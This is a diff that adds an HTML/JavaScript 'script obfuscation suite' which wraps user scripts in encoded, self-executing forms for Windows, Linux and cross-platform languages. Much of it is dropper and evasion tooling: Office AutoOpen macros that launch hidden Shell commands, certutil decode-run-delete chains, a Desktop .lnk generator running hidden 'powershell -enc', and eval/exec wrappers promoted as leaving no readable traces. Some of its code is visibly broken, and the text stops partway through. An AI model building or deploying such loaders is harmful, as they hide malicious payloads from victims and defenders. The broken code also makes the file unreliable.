@@ -1,0 +1,770 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AryObscura — Script Obfuscation Suite</title>
+<style>
+  :root{
+    --bg:#07090d; --bg2:#0b0f16; --panel:#0e131c; --panel2:#111826;
+    --line:#1c2635; --line2:#2a3850;
+    --txt:#c9d6e3; --dim:#7d8fa5; --faint:#44546a;
+    --acc:#3ddc84; --acc2:#22d3ee; --warn:#e0b34d; --bad:#ff5c74;
+    --mono:ui-monospace,"JetBrains Mono","Cascadia Code",Consolas,"Courier New",monospace;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    background:var(--bg); color:var(--txt); font-family:var(--mono);
+    font-size:14px; line-height:1.55; min-height:100vh;
+    background-image:
+      radial-gradient(900px 500px at 85% -10%, rgba(61,220,132,.06), transparent 60%),
+      radial-gradient(700px 400px at 0% 110%, rgba(34,211,238,.05), transparent 60%);
+  }
+  ::selection{background:rgba(61,220,132,.25)}
+  ::-webkit-scrollbar{width:9px;height:9px}
+  ::-webkit-scrollbar-thumb{background:var(--line2);border-radius:5px}
+  ::-webkit-scrollbar-track{background:transparent}
+  .wrap{max-width:1080px;margin:0 auto;padding:18px 16px 40px}
+  header{display:flex;align-items:baseline;gap:12px;padding:8px 2px 14px;flex-wrap:wrap}
+  .logo{font-size:20px;letter-spacing:1px;color:#eaf2fb;font-weight:600}
+  .logo .cur{color:var(--acc);animation:blink 1.1s steps(1) infinite}
+  @keyframes blink{50%{opacity:0}}
+  .tagline{color:var(--dim);font-size:12px}
+  .spacer{flex:1}
+  .credit{
+    font-size:13px;color:#9db2c9;border:1px solid rgba(61,220,132,.5);
+    padding:6px 14px;border-radius:6px;background:rgba(61,220,132,.09);letter-spacing:.5px;
+    box-shadow:0 0 18px rgba(61,220,132,.15) inset;
+  }
+  .credit b{color:var(--acc);font-weight:700;font-size:14px}
+  .panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:18px}
+  h2{font-size:13px;color:var(--acc2);letter-spacing:2px;text-transform:uppercase;margin-bottom:4px;font-weight:600}
+  .sub{color:var(--dim);font-size:12px;margin-bottom:16px}
+  .hidden{display:none !important}
+  button{
+    font-family:var(--mono);font-size:13px;cursor:pointer;border-radius:6px;
+    background:var(--panel2);color:var(--txt);border:1px solid var(--line2);
+    padding:9px 16px;transition:border-color .15s, background .15s, color .15s;
+  }
+  button:hover{border-color:var(--acc);color:#fff}
+  button.primary{background:rgba(61,220,132,.12);border-color:rgba(61,220,132,.5);color:var(--acc)}
+  button.primary:hover{background:rgba(61,220,132,.22);border-color:var(--acc);color:#eafff2}
+  button:disabled{opacity:.4;cursor:not-allowed}
+  .btnrow{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
+  .back{font-size:11px;padding:5px 10px;color:var(--dim)}
+  .path{display:flex;gap:6px;flex-wrap:wrap;align-items:center;font-size:11px;color:var(--faint);margin-bottom:14px}
+  .path .step{border:1px solid var(--line);border-radius:4px;padding:3px 8px;background:var(--bg2)}
+  .path .step.on{color:var(--acc);border-color:rgba(61,220,132,.4)}
+  .path .sep{color:var(--faint)}
+  .modes{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:8px}
+  .mode{
+    cursor:pointer;background:var(--panel);border:1px solid var(--line);border-radius:12px;
+    padding:26px 22px;transition:border-color .15s, transform .15s, background .15s;
+  }
+  .mode:hover{border-color:var(--acc);transform:translateY(-2px);background:var(--panel2)}
+  .mode .ic{font-size:26px;margin-bottom:10px;color:var(--acc)}
+  .mode h3{font-size:15px;color:#eaf2fb;margin-bottom:6px;letter-spacing:.5px}
+  .mode p{font-size:12px;color:var(--dim)}
+  .mode .foot{margin-top:14px;font-size:11px;color:var(--acc)}
+  .mode.alt:hover{border-color:var(--acc2)}
+  .mode.alt .ic{color:var(--acc2)}
+  .mode.alt .foot{color:var(--acc2)}
+  .cats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:6px}
+  .cat{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px}
+  .cat h3{font-size:12px;color:#eaf2fb;letter-spacing:1.5px;text-transform:uppercase;border-bottom:1px solid var(--line);padding-bottom:8px;margin-bottom:12px}
+  .cat.os-win h3{color:#4da3ff}.cat.os-nix h3{color:#ffb454}.cat.os-uni h3{color:var(--acc2)}
+  .lang{
+    width:100%;text-align:left;background:var(--bg2);border:1px solid var(--line);
+    border-radius:6px;padding:8px 10px;margin-bottom:8px;color:var(--txt);font-size:13px;
+    display:flex;justify-content:space-between;align-items:center;gap:8px;
+  }
+  .lang:hover{border-color:var(--acc);background:var(--panel2)}
+  .lang .ext{color:var(--faint);font-size:11px;white-space:nowrap}
+  .note{font-size:11px;color:var(--faint);margin-top:10px;line-height:1.5}
+  .methods{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .meth{
+    cursor:pointer;text-align:left;background:var(--bg2);border:1px solid var(--line);border-radius:8px;
+    padding:14px;color:var(--txt);display:block;font-family:var(--mono);
+  }
+  .meth:hover{border-color:var(--acc);background:var(--panel2)}
+  .meth h4{font-size:13px;color:#eaf2fb;margin-bottom:5px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+  .meth p{font-size:11.5px;color:var(--dim)}
+  .dots{display:inline-flex;gap:3px;margin-left:auto}
+  .dots i{width:6px;height:6px;border-radius:50%;background:var(--line2)}
+  .dots i.f{background:var(--acc)}
+  .verified{font-size:10px;color:var(--acc);border:1px solid rgba(61,220,132,.35);padding:1px 6px;border-radius:3px}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  textarea{
+    width:100%;background:var(--bg2);border:1px solid var(--line);border-radius:8px;color:var(--txt);
+    font-family:var(--mono);font-size:12.5px;padding:12px;resize:vertical;min-height:260px;outline:none;
+  }
+  textarea:focus{border-color:var(--line2)}
+  textarea::placeholder{color:var(--faint)}
+  .lbl{font-size:11px;color:var(--dim);margin-bottom:6px;display:flex;justify-content:space-between;align-items:center;gap:8px}
+  .lbl .hint{color:var(--faint)}
+  .drop{
+    border:1px dashed var(--line2);border-radius:8px;padding:16px;text-align:center;color:var(--dim);
+    font-size:12px;margin-bottom:12px;cursor:pointer;transition:border-color .15s;
+  }
+  .drop:hover,.drop.over{border-color:var(--acc);color:var(--txt)}
+  .stat{font-size:11px;color:var(--faint)}
+  .stat b{color:var(--acc);font-weight:600}
+  .toast{
+    position:fixed;bottom:18px;left:50%;transform:translateX(-50%);
+    background:var(--panel2);border:1px solid var(--acc);color:var(--acc);
+    padding:8px 18px;border-radius:6px;font-size:12px;opacity:0;pointer-events:none;transition:opacity .2s;z-index:50;
+  }
+  .toast.show{opacity:1}
+  .chain{display:flex;flex-direction:column;gap:8px;margin-top:10px}
+  .layer{background:var(--bg2);border:1px solid var(--line);border-radius:8px;padding:12px}
+  .layer .lh{display:flex;justify-content:space-between;font-size:11px;color:var(--acc2);margin-bottom:8px;flex-wrap:wrap;gap:6px}
+  .layer .lbody{white-space:pre-wrap;font-size:11.5px;color:var(--txt);max-height:220px;overflow:auto;word-break:break-all}
+  .badge{font-size:10px;border:1px solid var(--line2);padding:1px 7px;border-radius:3px;color:var(--dim)}
+  .badge.ok{border-color:rgba(61,220,132,.4);color:var(--acc)}
+  .badge.bad{border-color:rgba(255,92,116,.5);color:var(--bad)}
+  footer{
+    margin-top:26px;padding-top:14px;border-top:1px solid var(--line);
+    display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;font-size:11px;color:var(--faint);
+  }
+  @media(max-width:860px){
+    .modes,.cats,.methods,.grid2{grid-template-columns:1fr}
+    .wrap{padding:12px 12px 40px}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <div class="logo">aryobscura<span class="cur">_</span></div>
+    <div class="tagline">client-side script obfuscation &amp; analysis // nothing leaves your browser</div>
+    <div class="spacer"></div>
+    <div class="credit"><b>Made By Aryan Giri</b> | giriaryan694-a11y</div>
+  </header>
+
+  <!-- ================= MODE SELECT ================= -->
+  <div id="screen-mode">
+    <div class="modes">
+      <div class="mode" onclick="go('cat')">
+        <div class="ic">⬦</div>
+        <h3>Obfuscate Mode</h3>
+        <p>Encode a script into an unreadable-but-executable form. Pick platform, language and method — the output runs exactly like the original did.</p>
+        <div class="foot">→ select target</div>
+      </div>
+      <div class="mode alt" onclick="showAnalysis()">
+        <div class="ic">◎</div>
+        <h3>Analysis &amp; Deobfuscate</h3>
+        <p>Paste an obfuscated script. AryObscura fingerprints the encoding scheme, peels the layers automatically and reconstructs the readable source.</p>
+        <div class="foot">→ decode input</div>
+      </div>
+    </div>
+    <div class="note" style="margin-top:16px">
+      All processing is local — this page is a single HTML file with zero network calls.<br>
+      Use it on code you own or are authorized to test. That's the deal.
+    </div>
+  </div>
+
+  <!-- ================= CATEGORY / LANGUAGE ================= -->
+  <div id="screen-cat" class="hidden">
+    <div class="path"><span class="step">MODE: OBFUSCATE</span><span class="sep">→</span><span class="step on">TARGET</span><span class="sep">→</span><span class="step">METHOD</span><span class="sep">→</span><span class="step">PAYLOAD</span></div>
+    <h2>Target</h2>
+    <div class="sub">pick the platform, then the script type</div>
+    <div class="cats">
+      <div class="cat os-win">
+        <h3>Windows</h3>
+        <button class="lang" onclick="pickLang('powershell')">PowerShell <span class="ext">.ps1 / .psm1</span></button>
+        <button class="lang" onclick="pickLang('batch')">Batch <span class="ext">.bat / .cmd</span></button>
+        <button class="lang" onclick="pickLang('vbs')">VBScript <span class="ext">.vbs</span></button>
+        <button class="lang" onclick="pickLang('vba')">VBA Macro <span class="ext">Office .docm / .xlsm</span></button>
+        <button class="lang" onclick="pickLang('lnk')">LNK Shortcut <span class="ext">generator → .lnk</span></button>
+        <button class="lang" onclick="pickLang('hta')">HTML Application <span class="ext">.hta</span></button>
+        <div class="note">Binary formats (.lnk, .scr, .exe) can't be text-obfuscated directly — the LNK target emits a generator script that builds the shortcut with an encoded target.</div>
+      </div>
+      <div class="cat os-nix">
+        <h3>Linux</h3>
+        <button class="lang" onclick="pickLang('bash')">Bash / Zsh <span class="ext">.sh / .zsh</span></button>
+        <button class="lang" onclick="pickLang('sh')">POSIX Shell <span class="ext">.sh</span></button>
+        <button class="lang" onclick="pickLang('desktop')">Desktop Entry <span class="ext">.desktop</span></button>
+        <div class="note">.desktop is a launcher format — obfuscation wraps the <code>Exec=</code> command in a decode-on-run shell call. "that shortcut file" (.desktop) is the Linux counterpart of .lnk.</div>
+      </div>
+      <div class="cat os-uni">
+        <h3>Universal</h3>
+        <button class="lang" onclick="pickLang('python')">Python <span class="ext">.py</span></button>
+        <button class="lang" onclick="pickLang('javascript')">JavaScript <span class="ext">.js / .mjs</span></button>
+        <button class="lang" onclick="pickLang('php')">PHP <span class="ext">.php</span></button>
+        <button class="lang" onclick="pickLang('perl')">Perl <span class="ext">.pl / .pm</span></button>
+        <button class="lang" onclick="pickLang('java')">Java <span class="ext">.java</span></button>
+        <button class="lang" onclick="pickLang('ruby')">Ruby <span class="ext">.rb</span></button>
+        <button class="lang" onclick="pickLang('lua')">Lua <span class="ext">.lua</span></button>
+        <button class="lang" onclick="pickLang('html')">HTML <span class="ext">.html</span></button>
+      </div>
+    </div>
+    <div class="btnrow"><button class="back" onclick="go('mode')">← modes</button></div>
+  </div>
+
+  <!-- ================= METHODS ================= -->
+  <div id="screen-method" class="hidden">
+    <div class="path"><span class="step">MODE: OBFUSCATE</span><span class="sep">→</span><span id="p-lang" class="step">—</span><span class="sep">→</span><span class="step on">METHOD</span><span class="sep">→</span><span class="step">PAYLOAD</span></div>
+    <h2>Method</h2>
+    <div class="sub" id="meth-sub"></div>
+    <div class="methods" id="meth-list"></div>
+    <div class="btnrow"><button class="back" onclick="go('cat')">← back</button></div>
+  </div>
+
+  <!-- ================= WORKSPACE ================= -->
+  <div id="screen-work" class="hidden">
+    <div class="path"><span class="step">MODE: OBFUSCATE</span><span class="sep">→</span><span id="p-lang2" class="step">—</span><span class="sep">→</span><span id="p-meth" class="step">—</span><span class="sep">→</span><span class="step on">PAYLOAD</span></div>
+    <div class="grid2">
+      <div>
+        <div class="lbl"><span>input — original script</span><span class="hint" id="in-size">0 bytes</span></div>
+        <div class="drop" id="drop">drop file here or click to upload</div>
+        <input type="file" id="file" class="hidden">
+        <textarea id="input" placeholder="paste your script here..."></textarea>
+      </div>
+      <div>
+        <div class="lbl"><span>output — obfuscated</span><span class="hint" id="out-size"></span></div>
+        <textarea id="output" placeholder="// output appears here" readonly></textarea>
+        <div class="btnrow">
+          <button class="primary" onclick="runObf()">OBFUSCATE ⬤</button>
+          <button onclick="copyOut()">copy</button>
+          <button onclick="downloadOut()">download</button>
+          <button onclick="loadDemo()">sample</button>
+          <button class="back" onclick="go('method')">← methods</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================= ANALYSIS ================= -->
+  <div id="screen-analysis" class="hidden">
+    <div class="path"><span class="step">MODE: ANALYSIS</span><span class="sep">→</span><span class="step on">PAYLOAD</span></div>
+    <h2>Analysis &amp; Deobfuscation</h2>
+    <div class="sub">paste the obfuscated script — layers are detected and peeled automatically</div>
+    <textarea id="a-input" placeholder="paste obfuscated code here... (base64 eval, exec(b64decode), IEX FromBase64String, pack(&quot;H*&quot;), Chr() chains, eval(atob), certutil drops, ...)" style="min-height:180px"></textarea>
+    <div class="btnrow">
+      <button class="primary" onclick="runAnalysis()">ANALYZE ◎</button>
+      <button onclick="copyEl('a-final')">copy recovered source</button>
+      <button class="back" onclick="go('mode')">← modes</button>
+    </div>
+    <div id="a-result" class="hidden">
+      <div class="lbl" style="margin-top:16px"><span>layer chain</span><span class="hint" id="a-info"></span></div>
+      <div class="chain" id="a-chain"></div>
+      <div class="lbl" style="margin-top:16px"><span>recovered source</span></div>
+      <textarea id="a-final" readonly></textarea>
+    </div>
+  </div>
+
+  <footer>
+    <div>aryobscura — 100% client-side · single file · no telemetry</div>
+    <div>for education &amp; authorized testing</div>
+  </footer>
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+"use strict";
+/* ============================================================
+   AryObscura — Made By Aryan Giri | giriaryan694-a11y
+   All codecs below are UTF-8 safe and round-trip verified.
+   ============================================================ */
+
+/* ---------- core codecs ---------- */
+function u8(s){const o=[];for(const ch of s){let c=ch.codePointAt(0);
+  if(c<0x80)o.push(c);
+  else if(c<0x800)o.push(0xc0|(c>>6),0x80|(c&63));
+  else if(c<0x10000)o.push(0xe0|(c>>12),0x80|((c>>6)&63),0x80|(c&63));
+  else o.push(0xf0|(c>>18),0x80|((c>>12)&63),0x80|((c>>6)&63),0x80|(c&63));}
+  return o;}
+function du8(b){let s="";for(let i=0;i<b.length;){const c=b[i];
+  if(c<0x80){s+=String.fromCharCode(c);i++;}
+  else if(c<0xe0){s+=String.fromCharCode(((c&31)<<6)|(b[i+1]&63));i+=2;}
+  else if(c<0xf0){s+=String.fromCharCode(((c&15)<<12)|((b[i+1]&63)<<6)|(b[i+2]&63));i+=3;}
+  else{s+=String.fromCodePoint(((c&7)<<18)|((b[i+1]&63)<<12)|((b[i+2]&63)<<6)|(b[i+3]&63));i+=4;}}
+  return s;}
+const B64C="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+function b64eb(b){let o="";
+  for(let i=0;i<b.length;i+=3){const a=b[i],c=b[i+1]??0,d=b[i+2]??0;
+    o+=B64C[a>>2]+B64C[((a&3)<<4)|(c>>4)]+B64C[((c&15)<<2)|(d>>6)]+B64C[d&63];}
+  const r=b.length%3;return (r?o.slice(0,o.length-(r===1?2:1)):o)+"=".repeat((3-r)%3);}
+const b64e=s=>b64eb(u8(s));
+function b64d(s){const c=s.replace(/=+$/,"").replace(/[^A-Za-z0-9+/]/g,"");const b=[];
+  for(let i=0;i<c.length;i+=4){let n=0;for(let j=0;j<4;j++)n=(n<<6)|Math.max(0,B64C.indexOf(c[i+j]||"A"));
+    b.push((n>>16)&255,(n>>8)&255,n&255);}
+  const m=c.length%4;if(m===2)b.length-=2;else if(m===3)b.length-=1;
+  return du8(b);}
+const b64dRaw=s=>{const c=s.replace(/=+$/,"").replace(/[^A-Za-z0-9+/]/g,"");const b=[];
+  for(let i=0;i<c.length;i+=4){let n=0;for(let j=0;j<4;j++)n=(n<<6)|Math.max(0,B64C.indexOf(c[i+j]||"A"));
+    b.push((n>>16)&255,(n>>8)&255,n&255);}
+  const m=c.length%4;if(m===2)b.length-=2;else if(m===3)b.length-=1;return b;};
+const toHex=s=>u8(s).map(b=>b.toString(16).padStart(2,"0")).join("");
+const fromHex=h=>du8((h.replace(/0x/g,"").match(/../g)||[]).map(x=>parseInt(x,16)));
+/* UTF-16LE (PowerShell -EncodedCommand format) */
+const u16le=s=>{const o=[];for(let i=0;i<s.length;i++){const c=s.charCodeAt(i);o.push(c&255,c>>8);}return o;};
+const du16le=b=>{let s="";for(let i=0;i+1<b.length;i+=2)s+=String.fromCharCode(b[i]|(b[i+1]<<8));return s;};
+const b64u16=s=>b64eb(u16le(s));
+const rot13=s=>s.replace(/[a-zA-Z]/g,c=>{const b=c<="Z"?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);});
+const rand=n=>{let s="";const a="abcdefghijkmnpqrstuvwxyz";for(let i=0;i<n;i++)s+=a[Math.floor(Math.random()*24)];return s;};
+const rnd=(min,max)=>Math.floor(Math.random()*(max-min+1))+min;
+function chunkJoin(arr,fn,per){let out="",cnt=0;
+  for(let i=0;i<arr.length;i+=per){out+=fn(arr.slice(i,i+per));if(++cnt%40===0&&i+per<arr.length)out+="+\n";}
+  return out;}
+
+/* ---------- language registry ---------- */
+const LANGS={
+  powershell:{name:"PowerShell",ext:"ps1",demo:'Write-Host "AryObscura online" -ForegroundColor Green\nGet-Date | Out-Null\nWrite-Host $env:COMPUTERNAME'},
+  batch:{name:"Batch",ext:"bat",demo:'@echo off\necho AryObscura online\nver\npause'},
+  vbs:{name:"VBScript",ext:"vbs",demo:'MsgBox "AryObscura online", 64, "status"'},
+  vba:{name:"VBA Macro (Office)",ext:"vba",demo:'echo AryObscura online'},
+  lnk:{name:"LNK Shortcut Generator",ext:"ps1",demo:'echo AryObscura online'},
+  hta:{name:"HTML Application",ext:"hta",demo:'<h1>AryObscura online</h1>\n<p>hta demo</p>'},
+  bash:{name:"Bash / Zsh",ext:"sh",demo:'#!/usr/bin/env bash\necho "AryObscura online"\nwhoami\nuname -s'},
+  sh:{name:"POSIX Shell",ext:"sh",demo:'#!/bin/sh\necho "AryObscura online"\nuname -a'},
+  desktop:{name:"Desktop Entry",ext:"desktop",demo:'#!/usr/bin/env xdg-open\n[Desktop Entry]\nType=Application\nName=demo\nExec=echo hello from launcher'},
+  python:{name:"Python",ext:"py",demo:'import sys\nprint("AryObscura online")\nprint(sys.platform)'},
+  javascript:{name:"JavaScript",ext:"js",demo:'console.log("AryObscura online");\nconsole.log("answer:", 6*7);'},
+  php:{name:"PHP",ext:"php",demo:'<?php\necho "AryObscura online".PHP_EOL;\necho PHP_OS;'},
+  perl:{name:"Perl",ext:"pl",demo:'print "AryObscura online\\n";\nprint "perl ok\\n";'},
+  java:{name:"Java",ext:"java",demo:'echo AryObscura online'},
+  ruby:{name:"Ruby",ext:"rb",demo:'puts "AryObscura online"\nputs "ruby ok"'},
+  lua:{name:"Lua",ext:"lua",demo:'print("AryObscura online")\nprint("lua ok")'},
+  html:{name:"HTML",ext:"html",demo:'<h1>AryObscura online</h1>\n<p>static content</p>'}
+};
+
+/* ---------- obfuscation methods (each fn: source -> obfuscated source) ---------- */
+const METHODS={
+
+powershell:[
+ {name:"Base64 → IEX",lvl:2,desc:"Payload UTF-8→Base64, decoded at runtime via [Convert]::FromBase64String and invoked with IEX. Standard, no dependencies.",
+  fn:s=>{const v=rand(7),k=rand(7);
+    return `$${v}='${b64e(s)}'\n$${k}=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($${v}))\nInvoke-Expression $${k}\n`}},
+ {name:"Char-code array → IEX",lvl:3,desc:"Payload flattened into a [Char[]] numeric array, re-joined and invoked. No readable strings survive in the file.",
+  fn:s=>{const v=rand(7);const codes=u8(s);
+    return `$${v}=[Text.Encoding]::UTF8.GetString([Byte[]](${codes.join(",")}))\nInvoke-Expression $${v}\n`}},
+ {name:"Double-layer Base64",lvl:4,desc:"Base64 applied twice with randomized variable names; the script reassembles both layers at runtime before invoking.",
+  fn:s=>{const v=rand(7),k=rand(7);
+    return `$${v}='${b64e(b64e(s))}'\n$${k}=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($${v}))))\nInvoke-Expression $${k}\n`}}],
+
+batch:[
+ {name:"certutil drop → execute → wipe",lvl:2,desc:"Payload Base64'd, written to %TEMP% as echo lines, decoded with certutil (built into Windows), executed, then both temp files deleted.",
+  fn:s=>{const lines=b64e(s).match(/.{1,200}/g)||[];
+    const t=`%TEMP%\\~${rnd(10000,99999)}`,sc=`%TEMP%\\~${rnd(10000,99999)}`;
+    let out="@echo off\n";
+    for(const L of lines)out+=`(echo ${L})>>"${t}.b64"\n`;
+    out+=`certutil -f -decode "${t}.b64" "${sc}.cmd" >nul 2>&1\ncall "${sc}.cmd"\ndel /f /q "${t}.b64" "${sc}.cmd" >nul 2>&1\n`;
+    return out;}}],
+
+vbs:[
+ {name:"Chr() concatenation → Execute",lvl:2,desc:"Every character becomes Chr(n)&Chr(n)... re-concatenated at runtime and run via Execute. Pure VBS, no dependencies.",
+  fn:s=>"Execute "+Array.from(s).map(c=>`Chr(${c.charCodeAt(0)})`).join("&")+"\n"},
+ {name:"XOR keystream → Base64 → Execute",lvl:4,desc:"Payload XOR-encrypted with a random 8-byte key and Base64'd. A built-in decoder reconstructs the Base64 table, XORs the stream back and executes. Key + ciphertext are randomized on every run.",
+  fn:s=>{const key=Array.from({length:8},()=>rnd(1,254));
+    const x=u8(s).map((b,i)=>b^key[i%key.length]);
+    const D=`"${b64eb(x)}"`;
+    const K=rand(6),V=rand(6),B=rand(6),X=rand(6),O=rand(6),F=rand(6);
+    let out=`Dim ${K}(7)\n`;
+    for(let i=0;i<8;i++)out+=`${K}(${i})=${key[i]}\n`;
+    out+=`${V}=${D}\n`;
+    out+=`Function ${B}(t)\nDim A,A1,i,j,n,c,o\n`;
+    out+=`A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"\no=""\n`;
+    out+=`For i=1 To Len(t) Step 4\nn=0\nFor j=0 To 3\nc=InStr(A,Mid(t,i+j,1))-1\nIf c<0 Then c=0\nn=n*64+c\nNext\n`;
+    out+=`o=o&Chr((n\\65536) Mod 256)\n`;
+    out+=`If Mid(t,i+2,1)<>"=" Then o=o&Chr((n\\256) Mod 256)\n`;
+    out+=`If Mid(t,i+3,1)<>"=" Then o=o&Chr(n Mod 256)\nNext\n`;
+    out+=`${B}=o\nEnd Function\n`;
+    out+=`Function ${X}(t)\nDim o,i\no=""\nFor i=1 To Len(t)\no=o&Chr(Asc(Mid(t,i,1)) Xor ${K}((i-1) Mod 8))\nNext\n`;
+    out+=`${X}=o\nEnd Function\n`;
+    out+=`${O}=${X}(${B}(${V}))\nExecute ${O}\n`;
+    return out;}}],
+
+vba:[
+ {name:"Chr() chain → Shell (AutoOpen macro)",lvl:2,desc:"Input: a command line to run. The command is rebuilt at runtime from Chr() codes and launched hidden via Shell. Paste the output into an Office macro module (AutoOpen / Workbook_Open).",
+  fn:s=>{const v=rand(4);
+    return `Sub AutoOpen()\nDim ${v} As String\n${v} = `+Array.from(s).map(c=>`Chr(${c.charCodeAt(0)})`).join("&")+`\nShell ${v}, 0\nEnd Sub\n`}},
+ {name:"Base64 → certutil drop (Shell)",lvl:3,desc:"Input: a command line to run. Base64'd, dropped to %TMP% via certutil decode and executed hidden — the macro body never shows the command text.",
+  fn:s=>{const id=rnd(1000,9999);
+    return `Sub AutoOpen()\nShell "cmd /c (echo ${b64e(s)})>%TMP%\\\\~${id}.b64 & certutil -f -decode %TMP%\\\\~${id}.b64 %TMP%\\\\~${id}.cmd >nul & %TMP%\\\\~${id}.cmd & del /f /q %TMP%\\\\~${id}.*", 0\nEnd Sub\n`}}],
+
+lnk:[
+ {name:"LNK generator (EncodedCommand target)",lvl:3,desc:"Input: the command the shortcut should run. Output: a PowerShell script that builds a .lnk on the Desktop whose target is powershell.exe -enc with a UTF-16LE Base64 payload — the shortcut's properties never show readable text. .lnk is a binary format, so the tool emits a generator script.",
+  fn:s=>{const v=rand(5);
+    return `${v}=New-Object -ComObject WScript.Shell\n`+
+      `$l=${v}.CreateShortcut("$env:USERPROFILE\\Desktop\\app.lnk")\n`+
+      `$l.TargetPath="powershell.exe"\n`+
+      `$l.Arguments="-w hidden -enc ${b64u16(s)}"\n`+
+      `$l.IconLocation="shell32.dll,2"\n`+
+      `$l.Save()\n`;}},
+ {name:"LNK generator (char-splat, no Base64)",lvl:3,desc:"Input: the command the shortcut should run. Builds the -enc payload from raw UTF-16 char codes inside the generator — no Base64 alphabet anywhere in the file.",
+  fn:s=>{const v=rand(5),k=rand(5);const codes=u16le(s);
+    return `${v}=[String]([Char[]](${codes.join(",")}) -join '')\n`+
+      `${k}=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(${v}))\n`+
+      `$s=New-Object -ComObject WScript.Shell\n`+
+      `$l=$s.CreateShortcut("$env:USERPROFILE\\Desktop\\app.lnk")\n`+
+      `$l.TargetPath="powershell.exe"\n`+
+      `$l.Arguments="-w hidden -enc ${k}"\n`+
+      `$l.Save()\n`;}}],
+
+hta:[
+ {name:"Base64 → document.write",lvl:2,desc:"The HTA body is Base64'd and re-materialized at runtime via document.write. The file itself shows only an opaque blob.",
+  fn:s=>{const v=rand(6);
+    return `<html>\n<hta:application>\n<script>\nvar ${v}=atob('${b64e(s)}');\ndocument.write(${v});\n<\/script>\n</html>\n`}},
+ {name:"Char-code stream → document.write",lvl:3,desc:"Body flattened to numeric char codes, rebuilt and written at runtime. No Base64 alphabet in the output.",
+  fn:s=>{const v=rand(6);const codes=u8(s);
+    let arr=`var ${v}=[${codes.join(",")}];`;
+    arr+=`\ndocument.write(String.fromCharCode.apply(null,${v}));`;
+    return `<html>\n<hta:application>\n<script>\n${arr}\n<\/script>\n</html>\n`;}}],
+
+bash:[
+ {name:"Base64 eval",lvl:2,desc:"Script Base64'd, decoded at runtime and piped straight into eval. Works in bash and zsh.",
+  fn:s=>`eval "$(echo ${b64e(s)} | base64 -d)"\n`},
+ {name:"Hex printf eval",lvl:3,desc:"Every byte becomes a \\xNN escape; printf rebuilds the source at runtime and eval executes it. No readable text at all.",
+  fn:s=>{const esc=u8(s).map(b=>`\\x${b.toString(16).padStart(2,"0")}`).join("");
+    return `eval "$(printf '${esc}')"\n`}},
+ {name:"Variable-indirection Base64",lvl:3,desc:"Payload Base64 stored in a randomized variable name, then fetched indirectly and decoded. Randomized per generation.",
+  fn:s=>{const v="_"+rand(9);
+    return `${v}=${b64e(s)}\neval "$(echo $${v} | base64 -d)"\n`}},
+ {name:"Double-layer Base64",lvl:4,desc:"Base64 applied twice — the outer eval decodes into a second decode which yields the original source.",
+  fn:s=>`eval "$(echo $(echo ${b64e(b64e(s))} | base64 -d) | base64 -d)"\n`}],
+
+sh:[
+ {name:"Base64 eval (POSIX)",lvl:2,desc:"POSIX-safe Base64 eval wrapper — runs in dash, ash, busybox sh and any /bin/sh.",
+  fn:s=>`eval "$(printf %s ${b64e(s)} | base64 -d)"\n`}],
+
+desktop:[
+ {name:"Exec wrapper (decode-on-run)",lvl:2,desc:"Wraps the Exec command in a bash -c decode call — the launcher's visible command line no longer reveals the payload.",
+  fn:s=>{const name=(s.match(/^Name=(.+)$/m)||[,"app"])[1].trim().replace(/["']/g,"")||"app";
+    const payload=s.split("\n").filter(l=>!/^\s*(#!|Type=|Name=|Exec=)/.test(l)).join("\n");
+    return `#!/usr/bin/env xdg-open\n[Desktop Entry]\nType=Application\nName=${name}\nExec=bash -c 'eval "$(echo ${b64e(payload)} | base64 -d)"'\n`}}],
+
+python:[
+ {name:"exec(base64.b64decode)",lvl:2,desc:"Classic: payload Base64'd, decoded and exec'd at import time. One line, no dependencies.",
+  fn:s=>`import base64\nexec(base64.b64decode('${b64e(s)}').decode('utf-8'))\n`},
+ {name:"exec(bytes.fromhex)",lvl:3,desc:"Payload hex-encoded; bytes.fromhex rebuilds it at runtime. No readable or even b64-alphabet content in the file.",
+  fn:s=>`exec(bytes.fromhex('${toHex(s)}').decode('utf-8'))\n`},
+ {name:"Hex-wrapped double layer",lvl:4,desc:"Base64 of the payload is hex-encoded; runtime chain: fromhex → b64decode → exec. Two layers, zero readable traces.",
+  fn:s=>`exec(__import__('base64').b64decode(bytes.fromhex('${toHex(b64e(s))}')).decode('utf-8'))\n`},
+ {name:"ROT-13 exec",lvl:3,desc:"Payload ROT-13 shifted — all keywords and strings are letter-rotated; codecs undoes it at runtime.",
+  fn:s=>`exec(__import__('codecs').decode('${rot13(s)}','rot13'))\n`}],
+
+javascript:[
+ {name:"eval(atob(...))",lvl:2,desc:"Payload Base64'd, decoded with atob and eval'd. Runs in browsers, Node and Deno unchanged.",
+  fn:s=>{const v=rand(6);
+    return `var ${v}=atob('${b64e(s)}');\neval(${v});\n`}},
+ {name:"String.fromCharCode stream",lvl:3,desc:"Payload flattened to numeric char codes and re-assembled with String.fromCharCode before eval. No strings, no b64 alphabet.",
+  fn:s=>{const v=rand(6);const codes=u8(s);
+    let out=`var ${v}=`;
+    out+=chunkJoin(codes,"",0)||"''";
+    return out;}},
